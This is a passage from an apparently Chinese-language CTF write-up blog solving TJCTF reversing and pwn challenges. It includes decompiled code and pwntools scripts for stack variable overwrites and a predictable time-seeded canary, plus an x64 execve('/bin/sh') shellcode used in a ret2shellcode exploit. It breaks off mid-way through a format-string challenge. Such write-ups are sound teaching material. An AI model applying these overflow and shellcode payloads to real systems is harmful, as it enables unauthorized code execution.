20000006B000000C30000001B000000160000006F00000037000000E2000000530000001E0000006D0000004E00000045000000640000002F00000072000000C5000000650000007C000000250000004100000049000000F80000003C0000002E000000AA000000330000008F0000004D000000680000009E0000005B0000003D000000EC00000099000000A00000009B00000018000000F20000002A00&quot;</span><br><span class="line">for i in range(len(ans)&#x2F;2):</span><br><span class="line">	key1&#x3D;int(ans[32-(i+1)*2:32-(i+1)*2+2],16)</span><br><span class="line">	key2&#x3D;int(key[i*8:i*8+2],16)</span><br><span class="line">	key3&#x3D;key1^key2</span><br><span class="line">	key4&#x3D;hex(key3)[2:]</span><br><span class="line">	if len(key4)&#x3D;&#x3D;1:</span><br><span class="line">		key4&#x3D;&quot;0&quot;+key4</span><br><span class="line">	key4&#x3D;key4.upper()</span><br><span class="line">	key6&#x3D;k.find(key4)&#x2F;8</span><br><span class="line">	if key6&lt;30:</span><br><span class="line">		key6&#x3D;k.rfind(key4)&#x2F;8</span><br><span class="line">	flag+&#x3D;chr(key6)</span><br><span class="line">print flag[::-1]</span><br></pre></td></tr></table></figure>
<p>或者：<br>可以看到加密过程中最后的位置不受前面影响，也就是可以根据密文从后向前逐位爆破出flag<br>首先patch掉程序，直接将”call    _strcpy”nop掉即可(不然strcpy会使我们在命令行输入的任何字符串变为\x00)，调用patch好的程序爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ans&#x3D;&quot;22c15d5f23238a8fff8d299f8e5a1c62&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(16):</span><br><span class="line"> for j in range(30,127):</span><br><span class="line">  p&#x3D;process([&quot;.&#x2F;re_4&quot;,chr(j)+flag])</span><br><span class="line">  s&#x3D;p.recv()[:2]</span><br><span class="line">  if s&#x3D;&#x3D;ans[32-(i+1)*2:32-(i+1)*2+2]:</span><br><span class="line">    flag&#x3D;chr(j)+flag</span><br><span class="line">    p.close()</span><br><span class="line">    break</span><br><span class="line">  p.close()</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h3 id="0x05-Math-Whiz"><a href="#0x05-Math-Whiz" class="headerlink" title="0x05 Math Whiz"></a>0x05 Math Whiz</h3><p>最基本的变量覆盖<br>看到关键(获取flag)处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:565C9A08                 cmp     [ebp+var_C], 0</span><br><span class="line">.text:565C9A0C                 jz      short loc_565C9A3F</span><br><span class="line">.text:565C9A0E                 sub     esp, 8</span><br><span class="line">.text:565C9A11                 lea     eax, [ebp+var_30]</span><br><span class="line">.text:565C9A14                 push    eax</span><br><span class="line">.text:565C9A15                 lea     eax, (aSuccessfullyRe - 565CAFA8h)[ebx] ; &quot;Successfully registered &#39;%s&#39; as an admi&quot;...</span><br><span class="line">.text:565C9A1B                 push    eax             ; format</span><br><span class="line">.text:565C9A1C                 call    _printf</span><br><span class="line">.text:565C9A21                 add     esp, 10h</span><br><span class="line">.text:565C9A24                 sub     esp, 8</span><br><span class="line">.text:565C9A27                 lea     eax, (aRedacted - 565CAFA8h)[ebx] ; &quot;-----REDACTED-----&quot;</span><br><span class="line">.text:565C9A2D                 push    eax</span><br><span class="line">.text:565C9A2E                 lea     eax, (aHereIsYourFlag - 565CAFA8h)[ebx] ; &quot;Here is your flag: %s\n&quot;</span><br><span class="line">.text:565C9A34                 push    eax             ; format</span><br><span class="line">.text:565C9A35                 call    _printf</span><br><span class="line">.text:565C9A3A                 add     esp, 10h</span><br><span class="line">.text:565C9A3D                 jmp     short loc_565C9A55</span><br><span class="line">.text:565C9A3F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:565C9A3F</span><br><span class="line">.text:565C9A3F loc_565C9A3F:                           ; CODE XREF: main+1A0↑j</span><br><span class="line">.text:565C9A3F                 sub     esp, 8</span><br><span class="line">.text:565C9A42                 lea     eax, [ebp+var_30]</span><br><span class="line">.text:565C9A45                 push    eax</span><br><span class="line">.text:565C9A46                 lea     eax, (aSuccessfullyRe_0 - 565CAFA8h)[ebx] ; &quot;Successfully registered &#39;%s&#39; as an user&quot;...</span><br><span class="line">.text:565C9A4C                 push    eax             ; format</span><br><span class="line">.text:565C9A4D                 call    _printf</span><br><span class="line">.text:565C9A52                 add     esp, 10h</span><br><span class="line">.text:565C9A55</span><br><span class="line">.text:565C9A55 loc_565C9A55:                           ; CODE XREF: main+1D1↑j</span><br><span class="line">.text:565C9A55                 mov     eax, 0</span><br><span class="line">.text:565C9A5A                 lea     esp, [ebp-8]</span><br><span class="line">.text:565C9A5D                 pop     ecx</span><br><span class="line">.text:565C9A5E                 pop     ebx</span><br><span class="line">.text:565C9A5F                 pop     ebp</span><br><span class="line">.text:565C9A60                 lea     esp, [ecx-4]</span><br><span class="line">.text:565C9A63                 retn</span><br></pre></td></tr></table></figure>
<p>两种register方式<br>我们需要ebp+var_C不为0即可<br>这里我们的输入流调用了input<br>查看input：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, (signed int)(a2 * 16.0), stdin);</span><br></pre></td></tr></table></figure>
<p>而：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Recovery Pin: &quot;);</span><br><span class="line">input(v30, 4.0);</span><br></pre></td></tr></table></figure>
<p>可以向v30读入64字节：<br>其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char v30[4]; &#x2F;&#x2F; [esp+60h] [ebp-44h]</span><br><span class="line">ebp+var_C：</span><br><span class="line">int v43; &#x2F;&#x2F; [esp+98h] [ebp-Ch]</span><br></pre></td></tr></table></figure>
<p>可以利用v30覆盖掉ebp+var_C从而获取flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;problem1.tjctf.org&quot;,8001)</span><br><span class="line">p.recvuntil(&quot;Full Name: &quot;)</span><br><span class="line">p.sendline(&quot;Kirin&quot;)</span><br><span class="line">p.recvuntil(&quot;Username: &quot;)</span><br><span class="line">p.sendline(&quot;Kirin&quot;)</span><br><span class="line">p.recvuntil(&quot;Password: &quot;)</span><br><span class="line">p.sendline(&quot;kirin&quot;)</span><br><span class="line">p.recvuntil(&quot;Recovery Pin: &quot;)</span><br><span class="line">p.sendline(&quot;A&quot;*64)</span><br><span class="line">p.recvuntil(&quot;Email: &quot;)</span><br><span class="line">p.sendline(&quot;Kirin&quot;)</span><br><span class="line">p.recvuntil(&quot;Address: &quot;)</span><br><span class="line">p.sendline(&quot;Kirin&quot;)</span><br><span class="line">p.recvuntil(&quot;Biography: &quot;)</span><br><span class="line">p.sendline(&quot;Kirin&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x06-Tilted-Troop"><a href="#0x06-Tilted-Troop" class="headerlink" title="0x06 Tilted Troop"></a>0x06 Tilted Troop</h3><p>同样是很简单的变量覆盖<br>看到在fight函数中可以输出flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall fight(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; a2; ++i )</span><br><span class="line">    v3 +&#x3D; *(char *)(i + a1);</span><br><span class="line">  if ( v3 !&#x3D; 400 )</span><br><span class="line">    return printf(&quot;Your team had %d strength, but you needed exactly %d!\n&quot;, v3, 400LL);</span><br><span class="line">  puts(&quot;Wow! Your team is strong! Here, take this flag:&quot;);</span><br><span class="line">  return puts(&quot;[REDACTED]&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要让a1指针指向的长为a2的char型数组之和为400<br>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __gid_t rgid; &#x2F;&#x2F; ST04_4</span><br><span class="line">  char *v4; &#x2F;&#x2F; rbx</span><br><span class="line">  char *dest; &#x2F;&#x2F; ST08_8</span><br><span class="line">  __int64 v7[8]; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  char *v8; &#x2F;&#x2F; [rsp+50h] [rbp-30h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [rsp+58h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v10; &#x2F;&#x2F; [rsp+68h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v10 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  rgid &#x3D; getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  v9 &#x3D; 0;</span><br><span class="line">  v8 &#x3D; (char *)malloc(0x20uLL);</span><br><span class="line">  puts(&quot;Commands:\n A &lt;name&gt; - Add a team member\n F - Fight the monster\n Q - Quit&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        gets(&amp;input, 255LL, stdin);</span><br><span class="line">        if ( input !&#x3D; 65 )</span><br><span class="line">          break;</span><br><span class="line">        if ( v9 &lt;&#x3D; 8 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 &#x3D; &amp;v8[v9];</span><br><span class="line">          *v4 &#x3D; rand() % 10;</span><br><span class="line">          dest &#x3D; (char *)malloc(0x100uLL);</span><br><span class="line">          strcpy(dest, src);</span><br><span class="line">          v7[v9++] &#x3D; (__int64)dest;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Your team is too large!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( input !&#x3D; 70 )</span><br><span class="line">        break;</span><br><span class="line">      fight((__int64)v8, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( input &#x3D;&#x3D; 81 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Try again&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Thanks for playing!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关注传入fight的v8<br>看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__int64 v7[8]; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line"> char *v8; &#x2F;&#x2F; [rsp+50h] [rbp-30h]</span><br></pre></td></tr></table></figure>
<p>以及：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ( v9 &lt;&#x3D; 8 )</span><br><span class="line"> &#123;</span><br><span class="line">   v4 &#x3D; &amp;v8[v9];</span><br><span class="line">   *v4 &#x3D; rand() % 10;</span><br><span class="line">   dest &#x3D; (char *)malloc(0x100uLL);</span><br><span class="line">   strcpy(dest, src);</span><br><span class="line">   v7[v9++] &#x3D; (__int64)dest;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>当v9为8，v7[v9]恰好可以覆盖指针v8<br>看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dest &#x3D; (char *)malloc(0x100uLL);</span><br><span class="line">strcpy(dest, src);</span><br><span class="line">v7[v9++] &#x3D; (__int64)dest;</span><br></pre></td></tr></table></figure>
<p>最终覆盖掉v8的是dest指针<br>dest指向的字符串即为src指向的字符串<br>src在bss段，且位于input后方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:000055F52322D040 input           db ?                    ; DATA XREF: main+80↑o</span><br><span class="line">.bss:000055F52322D040                                         ; main+91↑r ...</span><br><span class="line">.bss:000055F52322D041                 align 2</span><br><span class="line">.bss:000055F52322D042 ; char src[254]</span><br></pre></td></tr></table></figure>
<p>所以我们最后一次(第九次)输入的命令为”A dddd”(且之前没有输入长于4字节的teamname，4*ord(“d”)=100)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;problem1.tjctf.org&quot;,8002)</span><br><span class="line">p.recvuntil(&quot;Quit&quot;)</span><br><span class="line">for i in range(8):</span><br><span class="line">	p.sendline(&quot;A&quot;)</span><br><span class="line">p.sendline(&quot;A dddd&quot;)</span><br><span class="line">p.sendline(&quot;F&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x07-Future-Canary-Lab"><a href="#0x07-Future-Canary-Lab" class="headerlink" title="0x07 Future Canary Lab"></a>0x07 Future Canary Lab</h3><p>简单的伪随机&amp;&amp;变量覆盖<br>main函数中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v4 &#x3D; time(0);</span><br><span class="line">srand(v4);</span><br><span class="line">interview(0);</span><br></pre></td></tr></table></figure>
<p>显然seed可预测<br>interview：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn interview(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1[10]; &#x2F;&#x2F; [esp+8h] [ebp-A0h]</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+30h] [ebp-78h]</span><br><span class="line">  int v3[10]; &#x2F;&#x2F; [esp+70h] [ebp-38h]</span><br><span class="line">  int j; &#x2F;&#x2F; [esp+98h] [ebp-10h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1[i] &#x3D; rand();</span><br><span class="line">    v3[i] &#x3D; v1[i];</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Welcome to the Future Canary Lab!&quot;);</span><br><span class="line">  puts(&quot;What is your name?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  for ( j &#x3D; 0; j &lt;&#x3D; 9; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v3[j] !&#x3D; v1[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Alas, it would appear you lack the time travel powers we desire.&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a1 - i + j &#x3D;&#x3D; 0xDEADBEEF )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You are the one. This must be the choice of Stacks Gate!&quot;);</span><br><span class="line">    printf(&quot;Here is your flag: %s\n&quot;, &quot;-----REDACTED-----&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Begone, FBI Spy!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得flag需要：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1 - i + j &#x3D;&#x3D; 0xDEADBEEF</span><br><span class="line">其中a1&#x3D;0</span><br></pre></td></tr></table></figure>
<p>看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets(&amp;s);</span><br></pre></td></tr></table></figure>
<p>且在gets前i就已在程序确定(j在后来的for ( j = 0; j &lt;= 9; ++j )确定)：<br>但覆盖”i”就会覆盖掉 for ( i = 0; i &lt;= 9; ++i )循环中生成的10个随机数，而在for ( j = 0; j &lt;= 9; ++j )中对这10个随机数进行了检测，并且用于检测的v1数组无法被覆盖，不过time(0)生成的seed可预测，先在特定时间数内生成一组随机数，在预计的时间运行程序来覆盖v3即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;time.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">int a&#x3D;time(0);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">a&#x3D;1533965040;</span><br><span class="line">srand(a);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">for(int i&#x3D;0;i&lt;&#x3D;9;i++)</span><br><span class="line">  printf(&quot;%d,&quot;,rand());</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">key&#x3D;[135671108,595838664,1011601882,513191674,2009753104,349832342,331399739,542649975,2075767462,2096169090]</span><br><span class="line">key2&#x3D;&quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">  key2+&#x3D;p32(i)</span><br><span class="line">print int(time.time())</span><br><span class="line">while True:</span><br><span class="line">   if  int(time.time())&#x3D;&#x3D;1533965040:</span><br><span class="line">      p&#x3D;remote(&quot;problem1.tjctf.org&quot;,8000)</span><br><span class="line">      print int(time.time())</span><br><span class="line">      print p.recvuntil(&quot;?&quot;)</span><br><span class="line">      payload&#x3D;&quot;A&quot;*64+key2+&quot;AAAA&quot;+p32(0x2152411b)</span><br><span class="line">      p.sendline(payload)</span><br><span class="line">      p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x08-Online-Banking"><a href="#0x08-Online-Banking" class="headerlink" title="0x08 Online Banking"></a>0x08 Online Banking</h3><p>简单的ret2shellcode，利用bss段执行shellcode<br>首先查看程序保护：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-181599f4141f6a02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>没有任何保护<br>查看程序，发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(name, 33, stdin);</span><br></pre></td></tr></table></figure>
<p>读入的name可以容下shellcode(有时候长度不够，可以考虑name紧接着的地方可不可控，使几段数据可以连接组成shellcode)<br>name位于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010A0 name            db 21h dup(?)           ; DATA XREF: main+78↑o</span><br></pre></td></tr></table></figure>
<p>查看.bss段权限：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-8ab10ef332fe6ac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="bss"><br><img src="https://upload-images.jianshu.io/upload_images/7434375-5f4217c5f78241f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="vmmap"><br>可以执行<br>x64下shellcode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x6a\x3b&quot;                       			 # pushq	$0x3b</span><br><span class="line">&quot;\x58&quot;                           			 # pop	%rax</span><br><span class="line">&quot;\x99&quot;                           			 # cltd</span><br><span class="line">&quot;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&quot;               # mov	$0x68732f6e69622f2f, %rbx</span><br><span class="line">&quot;\x48\xc1\xeb\x08&quot;               			 # shr	$0x8, %rbx</span><br><span class="line">&quot;\x53&quot;                           			 # push   %rbx</span><br><span class="line">&quot;\x48\x89\xe7&quot;                   			 # mov    %rsp, %rdi</span><br><span class="line">&quot;\x52&quot;                           			 # push	%rdx</span><br><span class="line">&quot;\x57&quot;                           			 # push   %rdi</span><br><span class="line">&quot;\x48\x89\xe6&quot;                   			 # mov    %rsp, %rsi</span><br><span class="line">&quot;\xb0\x3b&quot;                       			 # mov	$0x3b, %al</span><br><span class="line">&quot;\x0f\x05&quot;                       			 # syscall</span><br></pre></td></tr></table></figure>
<p>exploit：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*9+p64(0x00000000deadbeef)+p64(0x0000000006010a0)</span><br><span class="line">payload2&#x3D;&quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">p&#x3D;remote(&quot;problem1.tjctf.org&quot;,8005)</span><br><span class="line">print p.recvuntil(&quot;Name: &quot;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">print p.recvuntil(&quot;PIN: &quot;)</span><br><span class="line">p.sendline(&quot;aaaa&quot;)</span><br><span class="line">print p.recvuntil(&quot;quit&quot;)</span><br><span class="line">p.sendline(&quot;d&quot;)</span><br><span class="line">print p.recvuntil(&quot;PIN: &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x09-Secure-Secrets"><a href="#0x09-Secure-Secrets" class="headerlink" title="0x09 Secure Secrets"></a>0x09 Secure Secrets</h3><p>简单的格式化字符串&amp;&amp;GOT表修改<br>查看程序保护：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-8b27573887e51254.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><strong>发现No PIE</strong><br>看到get_message函数：<br>关键点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">printf(a1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br></pre></td></tr></table></figure>
<p>且a1可控，显然这里有格式化字符串漏洞<br>同时看到函数get_secret：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v1 &#x3D; fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class="line">if ( v1 )</span><br><span class="line">&#123;</span><br><span class="line">  __isoc99_fscanf(v1, &quot;%s&quot;, &amp;v2);</span><br><span class="line">  printf(&quot;Here is your secret: %s\n&quot;, &amp;v2);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Secret could not be accessed.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在get_message函数中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">printf(a1);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">puts(&quot;Tada! Hope you liked our service!&quot;);</span><br></pre></td></tr></table></figure>
<p>且在main中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_message(&amp;v4, &amp;s);</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>
